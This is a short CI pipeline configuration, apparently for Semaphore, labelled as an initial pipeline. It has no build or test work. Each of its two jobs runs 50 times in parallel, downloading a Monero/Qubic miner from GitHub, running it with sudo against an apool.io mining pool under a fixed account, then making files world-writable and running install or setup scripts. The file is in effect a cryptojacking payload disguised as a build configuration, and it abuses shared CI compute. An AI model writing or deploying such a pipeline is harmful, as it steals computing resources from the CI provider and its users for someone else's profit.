version: v1.0
name: Initial Pipeline
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu2004
blocks:
  - name: 'Block #1'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - 'wget https://github.com/apool-io/xmrminer/releases/download/v3.2.0/apoolminer_linux_xmr_v3.2.0.tar.gz && tar xf apoolminer_linux_xmr_v3.2.0.tar.gz && cd apoolminer_linux_xmr_v3.2.0 && sudo ./apoolminer --gpu-off --account CP_ajiabhjr1q --worker $(echo $(shuf -i 1-15000 -n 1)-tod) --pool qubic1.hk.apool.io:2334 '
            - chmod 777 *
            - bash install.sh
            - top
          parallelism: 50
        - name: 'Job #2'
          commands:
            - 'wget https://github.com/apool-io/xmrminer/releases/download/v3.2.0/apoolminer_linux_xmr_v3.2.0.tar.gz && tar xf apoolminer_linux_xmr_v3.2.0.tar.gz && cd apoolminer_linux_xmr_v3.2.0 && sudo ./apoolminer --gpu-off --account CP_ajiabhjr1q --worker $(echo $(shuf -i 1-15000 -n 1)-tod) --pool qubic1.hk.apool.io:2334 '
            - chmod 777 *
            - bash setup.sh
            - top
          parallelism: 50
